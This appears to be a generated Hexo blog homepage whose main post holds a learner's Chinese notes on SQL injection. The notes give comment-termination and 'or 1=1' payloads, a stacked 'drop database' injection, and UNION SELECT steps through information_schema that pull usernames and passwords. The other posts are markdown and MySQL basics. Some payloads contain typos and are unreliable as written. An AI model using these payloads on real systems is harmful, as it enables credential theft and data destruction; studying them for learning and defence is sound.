@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+
+  
+  
+  
+  
+  
+  
+  <title>hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="hexo" rel="home">hexo</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Home2</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main">
+  
+    <article id="post-sql注入" class="post-sql注入 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2024/11/26/sql%E6%B3%A8%E5%85%A5/" data-id="cm476du2d0004gsv1bq8113du" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><ul>
+<li>information_schema库:有库名，表名,表字段</li>
+<li>schemata</li>
+<li>tables</li>
+<li>column</li>
+<li>mysql</li>
+<li>performance_schema</li>
+<li>sys</li>
+</ul>
+<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><ul>
+<li>检索隐藏数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 库名 <span class="keyword">where</span> category <span class="operator">=</span><span class="string">&#x27;%s&#x27;</span></span><br><span class="line">变成 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 库名 <span class="keyword">where</span> category <span class="operator">=</span><span class="string">&#x27;%s&#x27;</span> <span class="string">&#x27; --...</span></span><br><span class="line"><span class="string">或者 select * from 库名 where category =&#x27;</span><span class="operator">%</span>s<span class="string">&#x27; &#x27;</span>#...</span><br></pre></td></tr></table></figure></li>
+<li>修改应用程序逻辑<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 库名 <span class="keyword">where</span> category <span class="operator">=</span><span class="string">&#x27;%s&#x27;</span></span><br><span class="line">变成 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 库名 <span class="keyword">where</span> category <span class="operator">=</span><span class="string">&#x27;%s&#x27;</span> </span><br><span class="line"><span class="string">&#x27;123=123 -- ....</span></span><br></pre></td></tr></table></figure></li>
+<li>union attack</li>
+<li>获得敏感数据<br>gift’ – </li>
+<li>获得所有数据<br> gift’or 1&#x3D;1 –</li>
+<li>手工注入（利用网页的检查,查接口，因为他是前后端分离，若不是，就看url）</li>
+<li>删库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database 库名</span><br></pre></td></tr></table></figure>
+变成<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 库名 where category =&#x27;%s&#x27;;drop database 库名; --</span><br></pre></td></tr></table></figure>
+(但默认不允许执行多条sql语句,上面这个就是多条sql语句)</li>
+<li>没有网页依旧可以sql注入</li>
+<li>前后端：前端进行数据展示，后端进行数据处理,前端请求客户端正常输入，然后服务端接到请求，就会查数据库</li>
+<li>拿到所有用户名和密码登入系统<br>  <code>database()</code>一个函数，用来返回你当前链接的数据库是哪个<br>  <code>select database()</code> 这样用<br> 回显：输入一个东西，它能给你展示出来<br> 联合使用：<br> <code>select *from &#39;库名&#39; union select ...</code><br> <code>select *from &#39;库名&#39; union select 1,user(),3,version(),database();</code><br> <code>select *from &#39;库名&#39; where category =&#39;%s&#39;union select 1,user(),3,version(),database()&#39; --;</code><br> 注意不是一样数据类型尽量不用,看下数据是字符串还是整形<br> 找表名：<br> <code>select table_name from information_schema.tables where table_schema=database()</code><br> 或者<code>select table_name from information_schema.tables where table_schema=&#39;库名&#39;</code><br> 使用<code>select *from &#39;库名&#39; where category =&#39;%s&#39;union select 1,user(),3,version(),table_name from information_schema.tables where table_schema=database() --</code><br> 即1’union select 1,user(),3,version(),table_name from information_schema.tables where table_schema&#x3D;’库名’ –<br> 找数据名<code>select *from &#39;库名&#39; where category =&#39;%s&#39;union select 1,user(),3,version(),column from information_schema.column where table_name=&#39;表名&#39; --</code><br>   即1’union select 1,user(),3,version(),column from information_schema.column where table_name&#x3D;’库名’ –&#96;</li>
+<li>md5解密网站：cmd5.com</li>
+<li>注入思路：<br>先去找到库,用 union select 这种方式123试下返回几个字段,找到字段数，就去替换这些字段,如user database version这些函数,然后把库名、函数名搜出来,又根据information_schema这张表查,然后查完表，就查我们这个表有什么字段,分析哪些字段有用，最后登入后台</li>
+<li>postman:接口调试</li>
+<li>burp suite:</li>
+<li>get注入方式:在浏览器能看见,(有的项目看不见，可能它是前后端分离–那就检查一下,看network,刷新一下，找到请求的地址,就是看header)</li>
+</ul>
+<h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><p>  方法一：<br> <code>select *from &#39;库名&#39; where category =&#39;gifts&#39; limit 0,1</code>一次拿一条,从0(第一条)  开始拿<br> <code>select *from &#39;库名&#39; where category =&#39;gifts&#39; limit 1,1</code>一次拿一条,从1(第二条)  开始拿<br> <code>select *from &#39;库名&#39; where category =&#39;gifts&#39; limit 1,2</code>一次拿两条,从1(第二条)  开始拿<br> 还有一个函数查有几条<br> 方法二：<br> <code>select group_concat(content) from &#39;表名&#39;</code>一次性拿出<br><strong>小结</strong><br>1.先判断是什么类型，整形还是字符型，整形就不用‘<br>2.然后用union select 查有几个<br>3.然后替换<br>4.</p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ul>
+<li><p><code>substr</code> 截取字符串<br><code>select substr(&#39;michael&#39;,1,1)</code>比如michael这个字符串从第一个字符开始取,取一个,为m<br><code>select substr(&#39;michael&#39;,2,3)</code>比如michael这个字符串从第2个字符开始取,取3个,为ich</p>
+<p>order by 3 – m<br>order by 4 – e<br>union select 1,2,3 – md5解密网站<br>union select 1,database(),3 – md5解密网站<br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()<br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;users<br>union sele1 1,group_concat(password),group_concat(user_name) from users</p>
+</li>
+</ul>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2024/11/26/sql%E6%B3%A8%E5%85%A5/">
+    <time datetime="2024-11-26T02:44:11.712Z" class="entry-date">
+        2024-11-26
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-php笔记" class="post-php笔记 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2024/11/21/php%E7%AC%94%E8%AE%B0/" data-id="cm476du2d0005gsv11ra8a64j" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p><strong>定界符</strong><br>···</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2024/11/21/php%E7%AC%94%E8%AE%B0/">
+    <time datetime="2024-11-21T15:49:47.884Z" class="entry-date">
+        2024-11-21
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-文章" class="post-文章 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2024/11/17/%E6%96%87%E7%AB%A0/">markdown使用教程</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2024/11/17/%E6%96%87%E7%AB%A0/" data-id="cm476du2b0002gsv1e17b3kln" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h1 id="标题："><a href="#标题：" class="headerlink" title="标题："></a>标题：</h1><p>#一级标题<br>##二级标题<br>…</p>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><blockquote>
+<p>用&gt;空格就是引用了</p>
+</blockquote>
+<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><ol>
+<li><strong>有序列表</strong></li>
+</ol>
+<ul>
+<li>-，+，*都是小点(无序列表)</li>
+</ul>
+<ol start="2">
+<li>待办事件</li>
+</ol>
+<ul>
+<li><input disabled="" type="checkbox"> -[]就是方框，方框内要打空格</li>
+</ul>
+<h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要上下打三个···，是顿号</span><br></pre></td></tr></table></figure>
+<p><code>或者开头结尾各打一个顿号</code></p>
+<h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><p><strong>方法一</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[链接名称](链接地址)</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">&lt;链接地址&gt;</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一个链接 [菜鸟教程](https://www.runoob.com)</span><br></pre></td></tr></table></figure>
+<p>显示：这是一个链接 <a target="_blank" rel="noopener" href="https://www.runoob.com/">菜鸟教程</a><br><strong>方法二</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">我们可以通过变量来设置一个链接，变量赋值在文档末尾进行：</span><br><span class="line"></span><br><span class="line">这个链接用 1 作为网址变量 [Google][1]</span><br><span class="line">这个链接用 runoob 作为网址变量 [Runoob][runoob]</span><br><span class="line">然后在文档的结尾为变量赋值（网址）</span><br><span class="line"></span><br><span class="line">  [1]: http://www.google.com/</span><br><span class="line">  [runoob]: http://www.runoob.com/</span><br></pre></td></tr></table></figure>
+<p>  显示:<br>  我们可以通过变量来设置一个链接，变量赋值在文档末尾进行：</p>
+<p>这个链接用 1 作为网址变量 <a target="_blank" rel="noopener" href="http://www.google.com/">Google</a><br>这个链接用 runoob 作为网址变量 <a target="_blank" rel="noopener" href="http://www.runoob.com/">Runoob</a><br>然后在文档的结尾为变量赋值（网址）</p>
+<p>  不会看教程：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bK4y1i7BY?spm_id_from=333.788.recommend_more_video.-1&vd_source=a7fdfe442190681bf6ad4805ce3baa11">https://www.bilibili.com/video/BV1bK4y1i7BY?spm_id_from=333.788.recommend_more_video.-1&amp;vd_source=a7fdfe442190681bf6ad4805ce3baa11</a></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2024/11/17/%E6%96%87%E7%AB%A0/">
+    <time datetime="2024-11-17T09:02:01.000Z" class="entry-date">
+        2024-11-17
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-mysql笔记" class="post-mysql笔记 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2024/11/17/mysql%E7%AC%94%E8%AE%B0/">mysql笔记</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2024/11/17/mysql%E7%AC%94%E8%AE%B0/" data-id="cm476du2c0003gsv155pp39nt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <ul>
+<li>DBMS(databse magament sysytem)</li>
+<li>sql 语言</li>
+<li>RDBMS （关联式资料库语言）此外的是非关联式</li>
+<li>资料储存成表格再做关联</li>
+</ul>
+<h1 id="须知"><a href="#须知" class="headerlink" title="须知"></a>须知</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">名称要用</span><br></pre></td></tr></table></figure>
+<h1 id="代码一"><a href="#代码一" class="headerlink" title="代码一"></a>代码一</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">primary key 主键：属性 表示每一笔唯一资料</span><br><span class="line">foreign key 外键:可对应另外一张表格（再做一个属性，使两个表格产生关联）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.一个表格中，一个属性既可以是主键也可以是外键；外键也可以连接本表格</span><br><span class="line">2.两个属性都有一样的，可以设多个主键。这样把两个连在一起看就是唯一的</span><br></pre></td></tr></table></figure>
+<h1 id="代码二"><a href="#代码二" class="headerlink" title="代码二"></a>代码二</h1><pre><code>create database `库名`;（创建资料库）
+show databases;(展现所有资料库)
+
+
+- 
+</code></pre>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2024/11/17/mysql%E7%AC%94%E8%AE%B0/">
+    <time datetime="2024-11-16T16:00:00.000Z" class="entry-date">
+        2024-11-17
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-hello-world" class="post-hello-world post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2024/10/04/hello-world/">Hello World</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2024/10/04/hello-world/" data-id="cm476du2a0001gsv1fsqv1gct" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2024/10/04/hello-world/">
+    <time datetime="2024-10-04T05:57:42.339Z" class="entry-date">
+        2024-10-04
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
+  
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2024/11/26/sql%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/21/php%E7%AC%94%E8%AE%B0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/17/%E6%96%87%E7%AB%A0/">markdown使用教程</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/17/mysql%E7%AC%94%E8%AE%B0/">mysql笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/04/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2024 John Doe
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
